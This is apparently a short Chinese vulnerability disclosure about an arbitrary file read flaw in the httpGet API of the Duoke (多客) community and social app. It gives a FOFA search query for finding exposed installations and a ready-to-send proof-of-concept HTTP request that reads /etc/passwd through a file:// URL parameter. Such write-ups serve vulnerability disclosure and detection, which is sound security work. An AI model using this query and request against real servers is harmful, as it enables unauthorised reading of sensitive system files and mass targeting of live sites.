**fofa**

```
title="多客-兴趣交友神器"
```

**一、漏洞简述**

多客圈子论坛系统是支持文字发帖、语音贴、视频贴等，并可以创建语音聊天、在线聊天、语音房APP。快速建立社区兴趣圈、语音直播、礼物、商城、充值、宝箱、陌生社交系统APP、语音交友系统APP、婚恋系统app、直播系统app、本地门户app等各类应用的系统产品。其接口httpGet存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Length: 2

```

